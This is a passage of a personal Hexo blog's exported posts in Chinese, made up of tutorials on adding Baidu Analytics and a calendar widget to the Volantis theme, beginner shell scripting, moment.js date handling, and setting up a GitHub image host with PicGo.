meta:</span><br><span class="line">      header: [..., wordcount, ...]</span><br><span class="line">      footer: [..., wordcount, ...]</span><br></pre></td></tr></table></figure><h3 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h3><p>百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。</p><ol><li>访问<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计首页</a>，注册一个账号后登陆，添加你的博客网站。</li></ol><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200709204712.png" alt=""></p><ol start="2"><li><p>点击获取代码，复制该代码。</p></li><li><p>在主题配置文件中，增加以下内容：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnzz: true</span><br></pre></td></tr></table></figure><p>用于设置是否开启百度统计。</p><ol start="4"><li>在<code>themes/volantis/layout/_partial</code>目录下，新建一个<code>cnzz.ejs</code>文件，将刚才复制的内容粘贴进去：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.cnzz)&#123; %&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var _hmt &#x3D; _hmt || [];</span><br><span class="line">    (function () &#123;</span><br><span class="line">        var hm &#x3D; document.createElement(&quot;script&quot;);</span><br><span class="line">        hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">        var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0];</span><br><span class="line">        s.parentNode.insertBefore(hm, s);</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>最后将以下内容放在网站首页的尾部<code>themes/volantis/layout/_partial/footer.ejs</code>中：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&#39;cnzz&#39;) %&gt;</span><br></pre></td></tr></table></figure><p>完成以上所有操作之后，可以在<a href="https://tongji.baidu.com/sc-web/10000236600/home/site/index" target="_blank" rel="noopener">百度统计管理页面</a>检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。</p>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Volantis 主题优化 | 添加日历图</title>
      <link href="/hexo-volantis-theme-optimization-add-calendar/"/>
      <url>/hexo-volantis-theme-optimization-add-calendar/</url>
      
        <content type="html"><![CDATA[<p>一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。</p><p>默认效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709204832.png" alt=""></p><p>因为我使用的Hexo 主题是<code>Volantis</code>、而该主题目前并没有集成该控件，所以需要手动配置。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><p>Volantis 低版本可能会不适用于本文介绍的方法，可以参考 <code>YINUXY</code> 的 <a href="https://cloud.tencent.com/developer/article/1597223" target="_blank" rel="noopener">Hexo主题美化 | 给你的博客加上GITHUB日历云和分类</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>在主题配置文件 <code>themes\volantis\_config.yml</code> 下添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postCalendar: true</span><br></pre></td></tr></table></figure><p>用于设置在归档页面中是否显示’文章日历’控件，如果不想显示，设置为 <code>false</code> 即可。</p></li><li><p>在归档页面 <code>themes/volantis/layout/archive.ejs</code> 添加以下代码：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;calendar&quot;&gt;</span><br><span class="line">&lt;% if (theme.postCalendar) &#123; %&gt;</span><br><span class="line">&lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>具体添加位置：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200709205348.png" alt="IMAGE"></p><p>这里会根据主题配置文件中的<code>postCalendar</code>的值，来判断是否需要渲染。</p><ol start="3"><li>点击下载日历样式文件 <a href="https://github.com/0xAiKang/CDN/blob/master/blog/js/post-calendar.ejs" target="_blank" rel="noopener">post-calendar.ejs</a>，放置于<code>themes/volantis/layout/_widget</code>目录下。</li></ol><p>将其中的第 16 行，替换成以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>至此已经完成了，使用<code>hexo generate &amp;&amp; hexo server</code>查看是否可以正常加载日历图。</p><p>默认的样式是高仿<code>gittee</code>，如果觉得不满意，可以参考<a href="https://echarts.apache.org/zh/option.html#calendar" target="_blank" rel="noopener">官方文档</a>自定义。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/cungudafa/article/details/106420842" target="_blank" rel="noopener">hexo（sakura）仿gitee添加文章贡献度日历图（echarts）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写第一个Shell 脚本</title>
      <link href="/write-the-first-shell-script/"/>
      <url>/write-the-first-shell-script/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录编写 Shell 脚本过程中的一些基础知识。</p><a id="more"></a><h2 id="什么是-shell-脚本"><a href="#什么是-shell-脚本" class="headerlink" title="什么是 shell 脚本"></a>什么是 shell 脚本</h2><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h2 id="创建第一个shell-脚本"><a href="#创建第一个shell-脚本" class="headerlink" title="创建第一个shell 脚本"></a>创建第一个shell 脚本</h2><p>下面我们来创建第一个 shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vim showdate</span><br><span class="line"></span><br><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line"># this script displays the date and who&#39;s logged on</span><br><span class="line">date</span><br><span class="line">who</span><br></pre></td></tr></table></figure><p>大功告成！这样就完成了一个简单的 shell 脚本的创建，是不是很简单！不过有以下几点需要注意：</p><ol><li>shell 脚本的名称不是一定需要用 .sh 来结尾，只是用 .sh 结尾会让其他人一目了然知道这是一个 shell 脚本文件。</li><li>在创建shell 脚本时，必须在第一行指定要使用的 shell，且格式固定为：<code>#!</code>开头。</li><li>第二行的井号作为注释行。</li></ol><p>运行shell 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">showdate</span><br><span class="line">$ .&#x2F;showdate</span><br><span class="line">bash: permission denied: .&#x2F;showdate</span><br><span class="line">$ sudo .&#x2F;showdate</span><br><span class="line">sudo: .&#x2F;showdate: command not found</span><br><span class="line">$ chmod u+x showdate</span><br><span class="line">$ .&#x2F;showdate</span><br></pre></td></tr></table></figure><p>创建完 shell 脚本，想要运行，有两种方案：</p><ol><li>将 shell 脚本所处的目录添加到 PATH 环境变量中;</li><li>在提示符中用绝对路径或者是相对路径来引用 shell 脚本文件;</li></ol><p>在上面的例子中，用的是绝对路径的方式来执行shell 脚本，使用单点操作符表示当前目录下的文件。</p><p>需要注意的是，因为文件夹权限的关系，而不能直接用 sudo 命令去执行，因为sudo 命令会检查showdate 并不在sudo 命令列表中。</p><p>所以正解是：修改该文件的文件夹权限。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于Shell编程的理解</title>
      <link href="/understanding-of-shell-programming/"/>
      <url>/understanding-of-shell-programming/</url>
      
        <content type="html"><![CDATA[<p>在开始聊Shell编程之前，我们先来看看计算机编程语言的都有哪些类型。</p><p>计算机语言可以分为两大类：</p><ol><li>低级语言</li><li>高级语言</li></ol><a id="more"></a><p>低级语言包括：<strong>机器语言</strong>和<strong>汇编语言</strong>。</p><p>高级语言包括：<strong>静态语言</strong>和<strong>动态语言</strong>。</p><p>这里就不对机器语言和汇编语言做介绍了，今天的主角是高级语言下的动态语言。</p><h3 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h3><p><strong>动态语言又叫做脚本语言。</strong></p><p>它和传统的静态语言的区别就在于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前者的运行过程为：编写-&gt;解释-&gt;执行</span><br><span class="line">而后者的运行过程为：编写-&gt;编译-&gt;链接-&gt;执行</span><br></pre></td></tr></table></figure><p>脚本语言的优势就在于 只要有一个可以写代码的编辑器和能解释执行的脚本解释器就行了。</p><p>这样一想，也就明白了为什么搭建<code>Python</code>的开发环境远比<code>C#</code>要快，因为它只要安装一个解释器就好了。</p><blockquote><p>动态语言与静态语言存在的争议之一：</p></blockquote><p>在静态语言中，写代码时必须知道每个变量的类型; 而在动态语言中，随便什么时候，你都可以把变量设为任意类型的值。</p><h3 id="Shell编程"><a href="#Shell编程" class="headerlink" title="Shell编程"></a>Shell编程</h3><p>最初在学习<code>Shell</code>脚本时，产生过这样一个问题：<br><strong>为什么还能用<code>PHP</code>写<code>Shell</code>脚本？</strong></p><p>当时就很不理解。这里就反应了两个问题：</p><ol><li>对<code>PHP</code>的理解不深</li><li>对<code>Shell</code>脚本的理解不深</li></ol><p><strong>理论上讲，只要一门语言提供了解释器，这门语言就可以胜任脚本编程。</strong></p><p>所以用 <code>PHP</code> 可以写 <code>Shell</code> 脚本，就没有什么好奇怪的了。<br>你可能会问：这句话里面的 <code>Shell</code>怎么理解？</p><p>还记得吗，<code>Shell</code>的概念是什么？</p><blockquote><p><code>Shell</code> 脚本就是将一堆的 <code>Shell</code> 命令以及指定执行 <code>Shell</code> ，通过放在一个文件中来执行。</p></blockquote><h3 id="脚本语言的分类"><a href="#脚本语言的分类" class="headerlink" title="脚本语言的分类"></a>脚本语言的分类</h3><p>脚本语言又可以分为以下两大类：</p><ol><li><code>Shell</code>脚本</li><li>通用动态语言</li></ol><h5 id="常见的Shell脚本："><a href="#常见的Shell脚本：" class="headerlink" title="常见的Shell脚本："></a>常见的Shell脚本：</h5><ul><li>sh</li><li>bash</li><li>csh</li><li>ksh</li><li>tcsh</li><li>zsh</li><li>AppleScript </li></ul><h5 id="常见的脚本语言"><a href="#常见的脚本语言" class="headerlink" title="常见的脚本语言"></a>常见的脚本语言</h5><ul><li>JavaScript</li><li>Perl</li><li>PHP</li><li>Python</li><li>Ruby</li><li>VBScript</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Linux的Shell、Shell脚本、Shell环境的理解</title>
      <link href="/understanding-of-linux-shell-shell-script-shell-environment/"/>
      <url>/understanding-of-linux-shell-shell-script-shell-environment/</url>
      
        <content type="html"><![CDATA[<p>如标题所示，这片笔记主要目的是加深对<code>Linux</code>的<code>Shell</code>、<code>Shell脚本</code>、<code>Shell环境</code>的理解。</p><a id="more"></a><h2 id="什么是Shell？"><a href="#什么是Shell？" class="headerlink" title="什么是Shell？"></a>什么是Shell？</h2><ul><li><p>在回答这个问题之前，我们先来考虑一个问题：人是如何跟计算机打交道的？或者说怎样让计算机按照我们的要求完成某个任务？</p><ul><li>现在和计算机交互的方式很简单，直接用图形界面的工具就好了，想要计算机完成某个任务，通过操作图形界面的工具就能到达目的。</li><li>那么在以前呢？在那个计算机还没有这么先进的时代呢？人们又是如何让计算完成某个任务。通过“命令”的方式告诉计算机我需要你帮你完成这件事。这个“命令”又是怎么告诉计算机的呢？通过一个交互工具。这个工具可以实现与计算机之间的“你问我答，你说我做”的功能。</li></ul></li><li><p><code>Shell</code>就是一种应用程序（注意：我这里用的是一种）。</p></li><li><p>这个应用程序提供了一个界面（方便我们与计算机进行交互），用户通过这个界面访问操作系统内核的服务。</p></li></ul><h2 id="什么是Shell脚本？"><a href="#什么是Shell脚本？" class="headerlink" title="什么是Shell脚本？"></a>什么是Shell脚本？</h2><p><code>Shell</code> 脚本（<code>Shell Script</code>），是一种为 <code>Shell</code> 编写的脚本程序。</p><blockquote><p>Shell 脚本编程有两种方式</p></blockquote><ol><li>交互式（Interactive）：用户每输入一条命令就立即执行。</li><li>批处理（Batch）：由用户事先编写好一个完整的<code>Shell</code>脚本，<code>Shell</code>会一次性执行脚本中诸多的命令。</li></ol><h2 id="什么是Shell环境"><a href="#什么是Shell环境" class="headerlink" title="什么是Shell环境"></a>什么是Shell环境</h2><p><code>Shell</code>编程跟<code>java</code>、<code>php</code>编程一样，只要有一个<strong>能编写代码的文本编辑器</strong>和一个<strong>能解释执行的脚本解释器</strong>就可以了。</p><h3 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h3><ul><li><code>Linux</code> 默认安装了 <code>Shell</code> 解释器。</li><li>在<code>Linux</code>中，主流的 <code>Shell</code> 是 <code>Bash</code>。</li></ul><p>在一般情况下，人们并不区分 <code>Bourne Shell</code> 和 <code>Bourne Again Shell</code>，所以，像 <code>#!/bin/sh</code>，它同样也可以改为 <code>#!/bin/bash</code>。</p><h3 id="0x02-Mac-OS"><a href="#0x02-Mac-OS" class="headerlink" title="0x02 Mac OS"></a>0x02 Mac OS</h3><ul><li>Mac OS不仅带了sh、bash这两个最基础的解释器，还内置了ksh、csh、zsh等不常用的解释器。</li></ul><h3 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a>0x03 Windows</h3><p>Windows 出厂时没有内置 <code>Shell</code> 解释器，通常我们都是安装<code>cygwin</code>或者<code>mingw</code> 模拟器来Linux环境。</p><ul><li><a href="http://www.cygwin.com/" target="_blank" rel="noopener">Cygwin</a></li><li><a href="http://www.mingw.org/" target="_blank" rel="noopener">Mingw</a></li></ul><p>如Git的交互界面就是由<code>Mingw</code>模拟器提供的<code>Bash</code>。</p><h4 id="脚本解释器"><a href="#脚本解释器" class="headerlink" title="脚本解释器"></a>脚本解释器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash &#x3D;&gt; Bourne Again Shell（&#x2F;bin&#x2F;bash）</span><br><span class="line">sh &#x3D;&gt;  Bourne Shell（&#x2F;usr&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;sh）</span><br><span class="line">csh &#x3D;&gt; C Shell（&#x2F;usr&#x2F;bin&#x2F;csh）</span><br><span class="line">ksh &#x3D;&gt; K Shell（&#x2F;usr&#x2F;bin&#x2F;ksh）</span><br><span class="line">Shell for Root（&#x2F;sbin&#x2F;sh）</span><br></pre></td></tr></table></figure><h4 id="第一个Shell脚本"><a href="#第一个Shell脚本" class="headerlink" title="第一个Shell脚本"></a>第一个Shell脚本</h4><p>打开Bash或者任何一个文本编辑器，新建一个文件 Hello.sh，扩展名为<code>sh</code>(sh代表shell)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#第一个Shell脚本</span><br><span class="line">#作用是列出当前目录下的所有文件的详情信息</span><br><span class="line">PWDS&#x3D;echo &#96;pwd&#96;</span><br><span class="line">cd $PWDS</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p>上面这个脚本中，有三种不同的元素：</p><ol><li>第一行的脚本声明（<code>#!</code>）用来告诉系统使用<strong>哪种 Shell 解释器</strong>来执行该脚本；</li><li>第二行的注释信息（<code>#</code>）是对脚本功能和某些命令的介绍信息，使得看到脚本时能快速反应是做什么的。</li><li>剩下没有前缀标识的就是 所要执行的脚本具体命令了。</li></ol><h4 id="运行Shell脚本"><a href="#运行Shell脚本" class="headerlink" title="运行Shell脚本"></a>运行Shell脚本</h4><p>有两种方式：</p><h5 id="1-作为可执行程序"><a href="#1-作为可执行程序" class="headerlink" title="1. 作为可执行程序"></a>1. 作为可执行程序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x example.sh    # 使脚本具有执行权限</span><br><span class="line">$ .&#x2F;example.sh           # 执行脚本</span><br></pre></td></tr></table></figure><h5 id="2-作为解释器参数"><a href="#2-作为解释器参数" class="headerlink" title="2. 作为解释器参数"></a>2. 作为解释器参数</h5><p>这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行脚本</span><br><span class="line">$ &#x2F;bin&#x2F;sh example.sh</span><br><span class="line">$ bash example.sh</span><br><span class="line">$ bash example.php</span><br></pre></td></tr></table></figure><p>使用这种方式时，可以不用在脚本第一行声明解释器信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat example.php</span><br><span class="line">#这是一个用php写的Shell脚本，有两个作用</span><br><span class="line">#1.确认是否用解释器参数执行shell脚本可以不用写声明</span><br><span class="line">#2.确认如何用php写shell脚本</span><br><span class="line">string&#x3D;&quot;php shell&quot;</span><br><span class="line">echo $string</span><br><span class="line">$ bash example.php</span><br><span class="line">php shell</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moment.js 用法总结</title>
      <link href="/moment-js-usage-summary/"/>
      <url>/moment-js-usage-summary/</url>
      
        <content type="html"><![CDATA[<p>最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。</p><p><a href="http://momentjs.cn/" target="_blank" rel="noopener">momentjs</a> 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。</p><a id="more"></a><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p><code>momentjs</code>支持多个环境，所有的代码都应该在这两种环境中都可以工作。</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install moment</span><br><span class="line">var moment &#x3D; require(&#39;moment&#39;);</span><br></pre></td></tr></table></figure><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>获取当前的日期和时间：</p><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moment();</span><br></pre></td></tr></table></figure><p>相当于moment(new Date()) 此处会返回一个moment封装的<strong>日期对象</strong>。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200707190535.png" alt=""></p><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;</span><br><span class="line">moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;</span><br><span class="line">moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;</span><br><span class="line">moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;</span><br><span class="line">moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;</span><br><span class="line">moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二</span><br><span class="line">moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳</span><br></pre></td></tr></table></figure><h4 id="转换为Date对象"><a href="#转换为Date对象" class="headerlink" title="转换为Date对象"></a>转换为Date对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)</span><br><span class="line">moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期</span><br></pre></td></tr></table></figure><h4 id="获取时间信息"><a href="#获取时间信息" class="headerlink" title="获取时间信息"></a>获取时间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒</span><br><span class="line">moment().date() &#x2F;&#x2F; 获取天</span><br><span class="line">moment().day()  &#x2F;&#x2F; 获取星期</span><br><span class="line">moment().dayOfYear()  &#x2F;&#x2F; 一年内的多少天</span><br><span class="line">moment().week() &#x2F;&#x2F; 一年里的多少周</span><br><span class="line">moment().month()  &#x2F;&#x2F; 获取当前月份（实际月份-1）</span><br><span class="line">moment().quarter() &#x2F;&#x2F; 一年内的第几个季度</span><br><span class="line">moment().year() &#x2F;&#x2F; 获取年份</span><br><span class="line">moment().daysInMonth() &#x2F;&#x2F; 获取当月天数</span><br></pre></td></tr></table></figure><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p>一旦解析和操作完成后，需要某些方式来显示 moment。</p><p>使用<code>format</code>来格式化日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;</span><br><span class="line">moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 时间戳转换为日期格式</span><br><span class="line">moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式</span><br><span class="line">moment().unix();        &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;X&quot;);   &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;x&quot;);   &#x2F;&#x2F; 获取Unix 毫秒时间戳</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何选择一个适合自己的图床</title>
      <link href="/how-to-choose-a-picture-bed-that-suits-you/"/>
      <url>/how-to-choose-a-picture-bed-that-suits-you/</url>
      
        <content type="html"><![CDATA[<p>因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。</p><p>如果不是因为<a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS</a> 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png" alt=""></p><p>于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。</p><p>使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。</p><a id="more"></a><blockquote><p>为什么不选择国内的那些图床服务？</p></blockquote><p>我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。</p><h3 id="图床管理工具"><a href="#图床管理工具" class="headerlink" title="图床管理工具"></a>图床管理工具</h3><p>有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 <a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a>，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。</p><h3 id="创建GitHub-图床"><a href="#创建GitHub-图床" class="headerlink" title="创建GitHub 图床"></a>创建GitHub 图床</h3><p>首先，你得有一个<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 账号。</p><h4 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h4><p>这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。</p><h4 id="2-获取授权token"><a href="#2-获取授权token" class="headerlink" title="2. 获取授权token"></a>2. 获取授权token</h4><p>通过<code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> <a href="https://github.com/settings/tokens/new" target="_blank" rel="noopener">创建一个新的token</a> 用于PicGo操作你的仓库。</p><p>把repo的勾打上即可，点击Generate token的绿色按钮生成 token。</p><p>创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。</p><h3 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h3><p>GitHub 图床的配置还是比较简单的，下面是参数说明。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225324.png" alt=""></p><ul><li>仓库名：你的图床仓库的名称，格式为：<code>username/repository</code></li><li>分支名：一般选择默认分支 <code>master</code></li><li>Token：刚才生成的 Token</li><li>存储路径：指定存放在仓库的哪个目录下</li><li>自定义域名：<code>raw.githubusercontent.com/username/repository/branch</code></li></ul><p>自定义域名最好按照一定的规则去定义：<code>raw.githubusercontent.com</code>+你的github用户名+仓库名称+分支名称</p><blockquote><p><code>raw.githubusercontent.com</code> 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets 